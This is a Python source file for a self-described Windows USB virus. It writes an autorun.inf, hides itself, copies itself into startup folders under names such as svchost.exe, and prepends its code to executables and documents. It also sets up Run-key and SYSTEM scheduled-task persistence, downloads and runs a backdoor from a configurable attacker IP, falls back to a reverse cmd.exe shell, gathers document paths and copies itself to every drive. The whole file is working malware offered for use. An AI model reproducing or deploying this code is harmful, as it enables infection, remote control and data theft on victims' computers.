import os
import sys
import shutil
import socket
import subprocess
import time
import requests
import winreg
import ctypes
import random

# ============================================
# CONFIGURATION - CHANGE THIS!
# ============================================

ATTACKER_IP = "192.168.1.4"  # CHANGE to your Kali IP
ATTACKER_PORT = 4444

# ============================================
# VIRUS CLASS
# ============================================

class USBVirus:
    def __init__(self):
        self.virus_path = sys.argv[0]
        self.infected_files = []
        self.usb_drive = os.path.dirname(self.virus_path)  # Get USB drive letter
        self.backup_paths = []
        
    def hide_self(self):
        """Hide the virus file on USB"""
        try:
            ctypes.windll.kernel32.SetFileAttributesW(self.virus_path, 2)  # HIDDEN
        except:
            pass
    
    def autorun_infection(self):
        """Create autorun.inf for auto-execution"""
        try:
            autorun_path = os.path.join(self.usb_drive, "Autorun.inf")
            with open(autorun_path, "w") as f:
                f.write("[AutoRun]\n")
                f.write(f"open={os.path.basename(self.virus_path)}\n")
                f.write("action=Open folder to view files\n")
                f.write("shell\\open\\command={}\n".format(os.path.basename(self.virus_path)))
                f.write("shell\\explore\\command={}\n".format(os.path.basename(self.virus_path)))
                f.write("UseAutoPlay=1\n")
            
            # Hide autorun.inf
            ctypes.windll.kernel32.SetFileAttributesW(autorun_path, 2)  # HIDDEN
            print("[+] Autorun.inf created")
        except:
            pass
    
    def copy_to_system(self):
        """Copy virus to Windows system folder (persistent)"""
        try:
            # Target locations (priority order)
            targets = [
                os.environ.get("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",  # Startup folder
                os.environ.get("TEMP") + "\\",
                "C:\\Windows\\Temp\\",
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"
            ]
            
            for target in targets:
                if not target:
                    continue
                try:
                    if not os.path.exists(target):
                        os.makedirs(target)
                    
                    # Copy with system name
                    new_name = random.choice([
                        "winlogon.exe", "svchost.exe", "explorer.exe", 
                        "lsass.exe", "services.exe", "wininit.exe"
                    ])
                    
                    dest_path = os.path.join(target, new_name)
                    shutil.copy2(self.virus_path, dest_path)
                    
                    # Hide the copied file
                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)  # HIDDEN
                    
                    self.backup_paths.append(dest_path)
                    print(f"[+] Copied to: {dest_path}")
                    
                    # Stop after first successful copy
                    break
                except:
                    continue
                    
            return True
        except:
            return False
    
    def spread_to_files(self):
        """Infect files on the system"""
        print("[*] Spreading to files...")
        targets = [
            os.environ.get("APPDATA"),
            os.environ.get("USERPROFILE"),
            "C:\\Program Files",
            "C:\\Windows\\Temp"
        ]
        
        for target in targets:
            if not target: continue
            if not os.path.exists(target): continue
            
            for root, dirs, files in os.walk(target):
                if len(self.infected_files) > 100: break
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in [".exe", ".py", ".doc", ".xls"]:
                        self.infect_file(os.path.join(root, file))
        
        print(f"[+] Infected {len(self.infected_files)} files")
        return self.infected_files
    
    def infect_file(self, file_path):
        """Infect a single file"""
        try:
            # Skip if already infected
            with open(file_path, "rb") as f:
                if b"INFECTED_BY_VIRUS" in f.read():
                    return False
            
            # Skip system files
            if "System32" in file_path or "Windows" in file_path:
                return False
            
            with open(self.virus_path, "rb") as f:
                virus_code = f.read()
            
            with open(file_path, "rb") as f:
                original_code = f.read()
            
            with open(file_path, "wb") as f:
                f.write(virus_code)
                f.write(b"\n# INFECTED_BY_VIRUS\n")
                f.write(original_code)
            
            self.infected_files.append(file_path)
            return True
        except:
            return False
    
    def install_persistence(self):
        """Install multiple persistence mechanisms"""
        print("[*] Installing persistence...")
        
        # Method 1: Registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            
            # Use a random legitimate-looking name
            names = ["WindowsUpdate", "SecurityHealth", "SystemCheck", "OneDriveSetup"]
            name = random.choice(names)
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, 
                             f'"{self.virus_path}"')
            winreg.CloseKey(key)
            print("[+] Registry persistence installed")
        except:
            pass
        
        # Method 2: Scheduled Task
        try:
            names = ["WindowsUpdate", "SystemMaintenance", "SecurityScan"]
            task_name = random.choice(names)
            subprocess.run([
                "schtasks", "/create", "/tn", task_name,
                "/tr", f'"{self.virus_path}"',
                "/sc", "onlogon", "/ru", "SYSTEM", "/f"
            ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print("[+] Scheduled task installed")
        except:
            pass
        
        # Method 3: Startup Folder (already done in copy_to_system)
        print("[+] Startup folder persistence installed")
        
        return True
    
    def install_backdoor(self):
        """Download and run the backdoor"""
        print("[*] Installing backdoor...")
        
        try:
            # First try to download
            try:
                response = requests.get(f"http://{ATTACKER_IP}/backdoor.exe", timeout=5)
                if response.status_code == 200:
                    backdoor_path = os.environ.get("TEMP") + "\\svchost.exe"
                    with open(backdoor_path, "wb") as f:
                        f.write(response.content)
                    # Execute
                    subprocess.Popen(backdoor_path, 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    print("[+] Backdoor downloaded and running")
                    time.sleep(2)
                    os.remove(backdoor_path)
                    return True
            except:
                pass
            
            # If download fails, use built-in backdoor
            self.built_in_backdoor()
            return True
            
        except:
            return False
    
    def built_in_backdoor(self):
        """Built-in backdoor if download fails"""
        print("[*] Starting built-in backdoor...")
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Redirect I/O
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Spawn shell
            subprocess.call(["cmd.exe"])
        except:
            pass
    
    def steal_data(self):
        """Steal sensitive files"""
        print("[*] Stealing data...")
        
        steal_targets = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads")
        ]
        
        stolen_files = []
        for target in steal_targets:
            if not os.path.exists(target): continue
            
            for root, dirs, files in os.walk(target):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in [".docx", ".xlsx", ".pptx", ".pdf", ".txt", ".zip"]:
                        file_path = os.path.join(root, file)
                        if os.path.getsize(file_path) < 5 * 1024 * 1024:
                            stolen_files.append(file_path)
                        if len(stolen_files) > 50: break
                if len(stolen_files) > 50: break
        
        # Log stolen files
        try:
            with open(os.path.expanduser("~/Desktop/STOLEN_FILES.txt"), "w") as f:
                f.write(f"=== STOLEN FILES ===\n")
                f.write(f"Time: {time.ctime()}\n")
                f.write(f"IP: {ATTACKER_IP}:{ATTACKER_PORT}\n\n")
                for file in stolen_files:
                    f.write(f"- {file}\n")
            print(f"[+] Stolen {len(stolen_files)} files logged")
        except:
            pass
        
        return stolen_files
    
    def create_self_replicator(self):
        """Create a copy of virus in multiple locations"""
        print("[*] Creating self-replicators...")
        
        # Copy to all drives
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                try:
                    dest = os.path.join(drive, f"{random.choice(['sys','win','boot'])}.exe")
                    shutil.copy2(self.virus_path, dest)
                    ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
                except:
                    pass
        
        print("[+] Self-replicators created")

# ============================================
# MAIN
# ============================================

def main():
    v = USBVirus()
    
    # Phase 1: Hide and autorun
    v.hide_self()
    v.autorun_infection()
    
    # Phase 2: Copy to system (persistence)
    v.copy_to_system()
    
    # Phase 3: Spread to files
    v.spread_to_files()
    
    # Phase 4: Install persistence
    v.install_persistence()
    
    # Phase 5: Install backdoor
    v.install_backdoor()
    
    # Phase 6: Steal data
    v.steal_data()
    
    # Phase 7: Create replicators
    v.create_self_replicator()
    
    # Phase 8: Self-delete from USB (optional)
    # Comment this out if you want the USB to keep the virus
    try:
        os.remove(sys.argv[0])
        print("[+] USB virus self-deleted")
    except:
        pass
    
    print("\n" + "="*50)
    print("✅ VIRUS EXECUTION COMPLETE!")
    print("   - Virus copied to system")
    print("   - Persistence installed")
    print("   - Backdoor running")
    print("   - Data stolen")
    print("   - Self-replicators created")
    print("="*50)

if __name__ == "__main__":
    main()
